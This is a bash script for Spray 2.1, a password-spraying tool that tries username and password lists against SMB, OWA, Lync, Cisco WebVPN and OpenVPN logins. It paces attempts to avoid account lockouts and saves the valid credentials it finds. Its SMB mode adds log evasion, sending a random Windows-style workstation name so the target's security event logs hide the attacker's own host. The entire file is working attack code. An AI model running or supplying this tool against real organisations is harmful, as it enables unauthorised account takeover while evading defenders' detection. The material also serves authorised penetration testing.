#!/bin/bash

echo -e "\nSpray 2.1 the Password Sprayer by Jacob Wilkin(Greenwolf)\n"

if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help" ] ; then
    echo "This script will password spray a target over a period of time"
    echo "Note: on macOS, rpcclient (smb mode) is provided by: brew install samba"
    echo "It requires password policy as input so accounts are not locked out"
    echo "Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain> <OptionalSkipUsernameUsernameSpray>"
    echo "  Tip: set SPRAY_NETBIOS_NAME=<name> to control the client name the target logs (hides your droplet hostname)."
    echo -e "Example: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION\n"
    echo -e "Example Skipping Username:Username Spray: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION NOUSERUSER\n"

    echo "To password spray an OWA portal, a file must be created of the POST request with Username: sprayuser@domain.com, and Password: spraypassword"
    echo "Useage: spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <RequestFile>"
    echo -e "Example: spray.sh -owa 192.168.0.1 usernames.txt passwords.txt 1 35 post-request.txt\n"

    echo "To password spray an lync service, a lync autodiscover url or a url that returns the www-authenticate header must be provided along with a list of email addresses"
    echo "Useage: spray.sh -lync <lyncDiscoverOrAutodiscoverUrl> <emailAddressList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
    echo "Example: spray.sh -lync https://lyncdiscover.company.com/ emails.txt passwords.txt 1 35\n"
    echo -e "Example: spray.sh -lync https://lyncweb.company.com/Autodiscover/AutodiscoverService.svc/root/oauth/user emails.txt passwords.txt 1 35\n"

    echo "To password spray an CISCO Web VPN a target portal or server hosting a portal must be provided"
    echo "Useage: spray.sh -cisco <targetURL> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
    echo -e "Example: spray.sh -cicso 192.168.0.1 usernames.txt passwords.txt 1 35\n"
    
    echo "To password spray an OpenVPN web portal a target IP address and port must be provided"
    echo "Useage: spray.sh -ovpn <targetIP> <targetPort> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
    echo -e "Example: spray.sh -ovpn 192.168.0.1 943 usernames.txt passwords.txt 1 35\n"

    echo -e "\nIt is also possible to update the supplied 2016/2017 password list to the current year"
    echo "Useage: spray.sh -passupdate <passwordList>"
    echo "Example: spray.sh -passupdate passwords.txt"
    echo -e "\nAn optional company name can also be provided to add to the list:"
    echo "Useage: spray.sh -passupdate <passwordList> <CompanyName>"
    echo "Example: spray.sh -passupdate passwords.txt Company"

    echo -e "\nA username list can also be generated from a list of common names:"
    echo "Useage: spray.sh -genusers <firstnames> <lastnames> \"<<fi><li><fn><ln>>\""
    echo "Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt \"<fi><ln>\""
    echo "Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt \"<fn>.<ln>\""

    echo ""
    echo "To install the dependencies (rpcclient/curl) for your OS (macOS/Debian/Kali):"
    echo "Useage: spray.sh --install"
    echo ""
    exit 0
fi
if [ "$1" == "--install" ] || [ "$1" == "install" ] ; then
    os=$(uname -s)
    echo "Installing dependencies for $os..."
    if [ "$os" == "Darwin" ] ; then
        if ! command -v brew >/dev/null 2>&1 ; then
            echo "Homebrew not found. Install it from https://brew.sh, then re-run: spray.sh --install"
            exit 1
        fi
        if ! command -v rpcclient >/dev/null 2>&1 ; then
            echo "Installing samba (provides rpcclient + smbclient) via Homebrew..."
            brew install samba
        fi
        if ! command -v curl >/dev/null 2>&1 ; then
            echo "Installing curl via Homebrew..."
            brew install curl
        fi
    else
        if [ -r /etc/os-release ] && grep -qE "^ID=(debian|ubuntu|kali)" /etc/os-release ; then
            if ! command -v rpcclient >/dev/null 2>&1 ; then
                echo "Installing samba-common-bin (provides rpcclient)..."
                sudo apt-get update && sudo apt-get install -y samba-common-bin
            fi
            if ! command -v curl >/dev/null 2>&1 ; then
                echo "Installing curl..."
                sudo apt-get install -y curl
            fi
        else
            echo "This OS isn't auto-detected (not macOS or Debian/Ubuntu/Kali)."
            echo "Install the dependencies manually:"
            echo "  rpcclient  - part of the samba package (e.g. apt-get install samba-common-bin on Debian/Kali)"
            echo "  curl       - part of the curl package"
            exit 1
        fi
    fi
    echo ""
    echo "Checking dependencies..."
    ok=1
    if command -v rpcclient >/dev/null 2>&1 ; then
        echo "  rpcclient: $(command -v rpcclient)  (smb mode)"
    else
        echo "  rpcclient: NOT FOUND  (smb mode unavailable)"
        ok=0
    fi
    if command -v curl >/dev/null 2>&1 ; then
        echo "  curl: $(command -v curl)  (owa/lync/cisco/ovpn modes)"
    else
        echo "  curl: NOT FOUND  (owa/lync/cisco/ovpn modes unavailable)"
        ok=0
    fi
    if [ $ok -eq 1 ] ; then
        echo ""
        echo "All dependencies present. You are ready to spray."
    else
        echo ""
        echo "Some dependencies are still missing (see above)."
    fi
    exit 0
fi


if [ "$1" == "-passupdate" ] || [ "$1" == "--passupdate" ] || [ "$1" == "passupdate" ] ; then

    if [ $# -eq 3 ] ; then 
        touch temp-passwords.txt
        echo "$31" >> temp-passwords.txt
        echo "$316" >> temp-passwords.txt
        echo "$317" >> temp-passwords.txt
        echo "$32016" >> temp-passwords.txt
        echo "$32017" >> temp-passwords.txt
        cat $2 >> temp-passwords.txt
        rm $2
        mv temp-passwords.txt $2
    fi

    echo -n "Updating Password List... "
    longdate1=$(date +%Y)
    longdate2=$(($longdate1-1))
    shortdate1=$(date +%y)
    if [ "$shortdate1" == "00" ] ; then
    	shortdate2="99"
    else
    	shortdate2=$(($shortdate1-1))
    fi
    
    #sed -i.bak s/2017/$longdate1/g $2

    #sed -i.bak s/2016/$longdate2/g $2
    sed -i.bak s/17/$shortdate1/g $2
    sed -i.bak s/16/$shortdate2/g $2
    echo "Complete"
    exit 0
fi

if [ "$1" == "-genusers" ] || [ "$1" == "--genusers" ] || [ "$1" == "genusers" ] ; then
    #spray.sh -genusers <firstnames> <lastnames> "<UsernameFormat>""
    touch generated-usernames.tmp
    echo "Generating Username list..."
    for firstname in $(cat $2); do 
        for lastname in $(cat $3); do 
            fi=${firstname:0:1}
            li=${lastname:0:1}
            echo "$4" | sed "s/<fi>/$fi/" | sed "s/<li>/$li/" | sed "s/<fn>/$firstname/" | sed "s/<ln>/$lastname/" >> generated-usernames.tmp
        done
    done
    cat generated-usernames.tmp | sort -u > generated-usernames.txt
    rm generated-usernames.tmp
    echo -e "Username list generated in generated-usernames.txt\n"
    exit 0
fi

if [ "$1" == "-calc-throttle" ] || [ "$1" == "--calc-throttle" ] || [ "$1" == "calc-throttle" ] ; then
    numusers=$(cat $2 | wc -l | sed 's/ //g')
    lockouttime=$3
    throttletime=$(($lockouttime*60*10000/$numusers))
    echo "To spray $numusers users over $lockouttime minutes,"
    echo "Intruder Throttle(milliseconds) should be: $throttletime"
    echo "Threads should be: 1"
    exit 0
fi

if [ $# -lt 5 ] ; then
    echo "Not Enough Arguments"
    echo "Useage: spray.sh <targetIP> <usernameList> <passwordList> <LockoutThreshold> <LockoutResetTimerInMinutes>"
    echo -e "Example: spray.sh 192.168.0.1 users.txt passwords.txt 4 30\n"
    exit 0
fi


#Internal Network SMB Spraying Code
if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
    mkdir -p logs
    set +H
    domain=$7
    nouseruser=$8
    # Client name reported to the target in the SMB session + the NTLM "Workstation
    # Name" field. Without -n both default to the local hostname (your droplet name),
    # which the client sees in security event 4624. "UNKNOWN" reads as a spray tool
    # and a fixed value is correlatable across runs, so by default we emit a fresh
    # random Windows 10/11-style name (DESKTOP-XXXXXXX) each invocation. Pin a
    # specific one with SPRAY_NETBIOS_NAME. Truncated to 15 (the NetBIOS limit).
    netbiosname="$SPRAY_NETBIOS_NAME"
    if [ -z "$netbiosname" ]; then
        netbiosname="DESKTOP-$(printf '%07X' $((RANDOM * 65536 + RANDOM)))"
    fi
    netbiosname="${netbiosname:0:15}"
    target=$2
    tr -d '\r' < $3 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
    userslist="logs/username-removed-successes.txt"
    tr -d '\r' < $4 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
    passwordlist=logs/passwords-clean.txt
    lockout=$5
    lockoutduration=$(($6 * 60))
    counter=0
    touch logs/spray-logs.txt

    #Initial spray for same username as password
    if [ "$nouseruser" == "" ] ; then
        time=$(date +%H:%M:%S)
        echo "$time Spraying with password: Users Username"
        while IFS= read -r u || [ -n "$u" ]; do
            [ -n "$u" ] || continue
        	out=$(rpcclient -n "$netbiosname" -U "$domain/$u%$u" -c "getusername;quit" $target 2>&1 | LC_ALL=C tr -d "\000-\037")
        	echo "$u%$u -> $out"
        	if echo "$out" | grep -q "Account Name"; then printf "SUCCESS	%s	%s" "$u" "$u" >> logs/spray-logs.txt; fi
        done < $userslist
        grep "^SUCCESS" logs/spray-logs.txt | awk -F '	' '{print $2 "%" $3}'
        counter=$(($counter + 1))
        if [ $counter -eq $lockout ] ; then
        	counter=0
        	sleep $lockoutduration
	fi
    fi

    #Then start on list
    while IFS= read -r password || [ -n "$password" ]; do
        [ -n "$password" ] || continue
        time=$(date +%H:%M:%S)
    	echo "$time Spraying with password: $password"
    	while IFS= read -r u || [ -n "$u" ]; do
    	    [ -n "$u" ] || continue
    		out=$(rpcclient -n "$netbiosname" -U "$domain/$u%$password" -c "getusername;quit" $target 2>&1 | LC_ALL=C tr -d "\000-\037")
    		echo "$u%$password -> $out"
    		if echo "$out" | grep -q "Account Name"; then printf "SUCCESS	%s	%s" "$u" "$password" >> logs/spray-logs.txt; fi
    	done < $userslist
        grep "^SUCCESS" logs/spray-logs.txt | awk -F '	' '{print $2 "%" $3}'
        grep "^SUCCESS" logs/spray-logs.txt | cut -d '	' -f 2 | sort -u > logs/usernamestoremove.txt
        grep "^SUCCESS" logs/spray-logs.txt | awk -F '	' '{print $2 "%" $3}' | sort -u > logs/credentials.txt
        while IFS= read -r user || [ -n "$user" ]; do
            [ -n "$user" ] || continue
            grep -v -F "$user" $userslist > $userslist.tmp && mv $userslist.tmp $userslist
        done < logs/usernamestoremove.txt
        rm logs/usernamestoremove.txt
    	counter=$(($counter + 1))
    	if [ $counter -eq $lockout ] ; then
    		counter=0
    		sleep $lockoutduration
    	fi
    done < $passwordlist
    exit 0
fi

#Alpha OWA Code
if [ "$1" == "-owa" ] || [ "$1" == "--owa" ] || [ "$1" == "owa" ] ; then
    mkdir -p logs
    set +H
    target=$2
    tr -d '\r' < $3 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
    userslist="logs/username-removed-successes.txt"
    tr -d '\r' < $4 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
    passwordlist=logs/passwords-clean.txt
    lockout=$5
    lockoutduration=$(($6 * 60))
    postrequest=$7
    counter=0
    touch logs/spray-logs.txt
    
    # strip a trailing CR (CRLF) from the pasted request; removes \r only, not the last char of every line
    sed -i.bak 's/\r$//' $postrequest

    #Initial spray for same username as password
    time=$(date +%H:%M:%S)
    echo "$time Spraying with password: Users Username"
    while IFS= read -r u || [ -n "$u" ]; do
        [ -n "$u" ] || continue
        #Grep out the cookies (avoids missing javascript generated cookies)
        cookies=$(cat $postrequest | grep "Cookie:")
        #Grep out the post data and replace filler data with username/password combo
        data=$(cat $postrequest | grep "^$" -A 1 | tail -n 1 | sed "s/sprayuser/$u/" | sed "s/spraypassword/$u/")
        #Grep out path to OWA post signin
        path=$(cat $postrequest | grep "POST" | cut -d ' ' -f 2)
        #Create target + path from target + path
        targetpath="$target$path"
        # silently follow redirctions and process additional cookies, send cookies as header, send data and output size of response, save this along with creds to log file
        (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | LC_ALL=C tr '\n' ' ' && echo "$u%$u") >> logs/spray-logs.txt
        rm -f cookies.txt
    done < $userslist
    # Check if there are more than one type of reponse
    lines=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | wc -l | sed 's/ //g')
    if [ "$lines" -ge "2" ]; then
        # Find least common response length, should be a correct credential combo
        lowest=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | cut -d ' ' -f 5 | head -n 1)
        cat logs/spray-logs.txt | grep "$lowest"
    fi
    counter=$(($counter + 1))
    if [ $counter -eq $lockout ] ; then
        counter=0
        sleep $lockoutduration
    fi
    #Then start on list
    while IFS= read -r password || [ -n "$password" ]; do
        [ -n "$password" ] || continue
        time=$(date +%H:%M:%S)
        echo "$time Spraying with password: $password"
        while IFS= read -r u || [ -n "$u" ]; do
            [ -n "$u" ] || continue
            cookies=$(cat $postrequest | grep "Cookie:")
            data=$(cat $postrequest | grep "^$" -A 1 | tail -n 1 | sed "s/sprayuser/$u/" | sed "s/spraypassword/$password/")
            path=$(cat $postrequest | grep "POST" | cut -d ' ' -f 2)
            targetpath="$target$path"
            (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | LC_ALL=C tr '\n' ' ' && echo "$u%$password") >> logs/spray-logs.txt
            rm -f cookies.txt
        done < $userslist
        lines=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | wc -l | sed 's/ //g')
        if [ "$lines" -ge "2" ]; then
            lowest=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | cut -d ' ' -f 5 | head -n 1)
            cat logs/spray-logs.txt | grep "$lowest"
            cat logs/spray-logs.txt | grep "$lowest" | cut -d ' ' -f 2- | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
            cat logs/spray-logs.txt | grep "$lowest" | cut -d ' ' -f 2- | sort -u > logs/credentials.txt
        fi

        while IFS= read -r completeuser || [ -n "$completeuser" ]; do
            [ -n "$completeuser" ] || continue
            sed -i.bak "/$completeuser/d" $userslist
        done < logs/usernamestoremove.txt
        rm logs/usernamestoremove.txt
        counter=$(($counter + 1))
        if [ $counter -eq $lockout ] ; then
            counter=0
            sleep $lockoutduration
        fi
    done < $passwordlist
fi

#Lync Password Spraying
if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
    mkdir -p logs
    set +H
    target=$2
    tr -d '\r' < $3 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
    userslist="logs/username-removed-successes.txt"
    tr -d '\r' < $4 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
    passwordlist=logs/passwords-clean.txt
    lockout=$5
    lockoutduration=$(($6 * 60))
    postrequest=$7
    counter=0
    touch logs/spray-logs.txt


    #Find proper url by redirecting from lyndiscover subdomains to place that lists autodiscover links, then grab oauth link
    autodiscover=$(curl -k -l $target 2>&1 | tr '"' '\n' | grep http | grep oauth)
    if [ -z "$autodiscover" ] ; then
        oauthaddress=$(curl -k -v -s $target 2>&1> /dev/null  | grep -i "Www-Authenticate:" | grep -i "MsRtcOAuth" | tr '"' '\n' | grep -i http)
        if [ -z "$oauthaddress" ] ; then
            echo "URL not valid for discover redirect or autodiscover link"
            exit
        fi
    else
        #Use oauth link to get the www-authenticate address to send the login request too
        echo "Redirect Successful..."
        oauthaddress=$(curl -k -v -s $autodiscover 2>&1> /dev/null | grep -i "Www-Authenticate:" | grep -i "MsRtcOAuth" | tr '"' '\n' | grep -i http)
        if [ -z "$oauthaddress" ] ; then
            echo "Could not locate oauth request in server response"
            exit
        fi
    fi
    
    #Then start on list
    while IFS= read -r password || [ -n "$password" ]; do
        [ -n "$password" ] || continue
        time=$(date +%H:%M:%S)
        echo "$time Spraying with password: $password"
        while IFS= read -r u || [ -n "$u" ]; do
            [ -n "$u" ] || continue
            access_token=$(curl -k -s --data "grant_type=password&username=$u&password=$password" $oauthaddress) 
            #access_token=""
            #echo "BREAKBREAKBREAKBREAK -------- xxXXXXX $u%$password"
            #echo "$u%$password"
            #echo "$access_token"
            if echo $access_token | grep -q "access_token" ; then
                echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
            else
                echo "Incorrect $u%$password" >> logs/spray-logs.txt
            fi
        done < $userslist
        cat logs/spray-logs.txt | grep "Valid Credentials"
        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | sort -u > logs/credentials.txt

        while IFS= read -r completeuser || [ -n "$completeuser" ]; do
            [ -n "$completeuser" ] || continue
            sed -i.bak "/$completeuser/d" $userslist
        done < logs/usernamestoremove.txt
        rm logs/usernamestoremove.txt
        counter=$(($counter + 1))
        if [ $counter -eq $lockout ] ; then
            counter=0
            sleep $lockoutduration
        fi
    done < $passwordlist
fi

#CISCO Web VPN Password Spraying
if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
    mkdir -p logs
    set +H
    tr -d '\r' < $3 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
    userslist="logs/username-removed-successes.txt"
    tr -d '\r' < $4 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
    passwordlist=logs/passwords-clean.txt
    lockout=$5
    lockoutduration=$(($6 * 60))
    postrequest=$7
    counter=0
    touch logs/spray-logs.txt

    target=$(echo $2 | cut -d '/' -f -3)
    targetpath="$target/+webvpn+/index.html"
    targetlogout="$target/+webvpn+/webvpn_logout.html"
    
    #Then start on list
    while IFS= read -r password || [ -n "$password" ]; do
        [ -n "$password" ] || continue
        time=$(date +%H:%M:%S)
        echo "$time Spraying with password: $password"
        while IFS= read -r u || [ -n "$u" ]; do
            [ -n "$u" ] || continue
            cookies="webvpn=; webvpnc=; webvpn_portal=; webvpnSharePoint=; webvpnlogin=1; webvpnLang=en;"
            ciscologin=$(curl -k -s -L -b cookies.txt $targetpath -H "$cookies" --data "tgroup=&next=&tgcookieset=&username=$u&password=$password&Login=Login")
            
            if echo $ciscologin | grep -q "SSL VPN Service" | grep "webvpn_logout" ; then
                echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
                curl -k -s -b cookies.txt $targetlogout
            else
                echo "Incorrect $u%$password" >> logs/spray-logs.txt
            fi
            rm -f cookies.txt
        done < $userslist

        cat logs/spray-logs.txt | grep "Valid Credentials"
        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | sort -u > logs/credentials.txt

        while IFS= read -r completeuser || [ -n "$completeuser" ]; do
            [ -n "$completeuser" ] || continue
            sed -i.bak "/$completeuser/d" $userslist
        done < logs/usernamestoremove.txt
        rm logs/usernamestoremove.txt
        counter=$(($counter + 1))
        if [ $counter -eq $lockout ] ; then
            counter=0
            sleep $lockoutduration
        fi
    done < $passwordlist
fi

#OpenVPN Web Portal Password Spraying
if [ "$1" == "-ovpn" ] || [ "$1" == "--ovpn" ] || [ "$1" == "ovpn" ] ; then
    mkdir -p logs
    set +H
    tr -d '\r' < $4 > logs/username-removed-successes.txt  # strip CR (CRLF lists) so no stray carriage return is sent with usernames
    userslist="logs/username-removed-successes.txt"
    tr -d '\r' < $5 > logs/passwords-clean.txt  # strip CR (CRLF lists) so no stray carriage return is sent with passwords
    passwordlist=logs/passwords-clean.txt
    lockout=$6
    lockoutduration=$(($7 * 60))
    postrequest=$8
    counter=0
    touch logs/spray-logs.txt

    target="https://$(echo $2 | cut -d '/' -f -3):$3"
    targetpath="$target/rest/GetUserlogin"

    #Then start on list
    while IFS= read -r password || [ -n "$password" ]; do
        [ -n "$password" ] || continue
        time=$(date +%H:%M:%S)
        echo "$time Spraying with password: $password"

        while IFS= read -r u || [ -n "$u" ]; do
            [ -n "$u" ] || continue
            ovpnlogin=$(curl -k -s -L -u $u:$password $targetpath)
            
            if echo $ovpnlogin | grep -q "OpenVPN client config"; then
                echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
            else
                if echo $ovpnlogin | grep -q "LOCKOUT"; then
                    echo "Account locked out! Try changing password policy setting"
                    exit
                fi
                echo "Incorrect $u%$password" >> logs/spray-logs.txt
            fi
        done < $userslist

        cat logs/spray-logs.txt | grep "Valid Credentials"
        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3- | sort -u > logs/credentials.txt

        while IFS= read -r completeuser || [ -n "$completeuser" ]; do
            [ -n "$completeuser" ] || continue
            sed -i.bak "/$completeuser/d" $userslist
        done < logs/usernamestoremove.txt
        rm logs/usernamestoremove.txt
        counter=$(($counter + 1))
        if [ $counter -eq $lockout ] ; then
            counter=0
            sleep $lockoutduration
        fi
    done < $passwordlist
fi
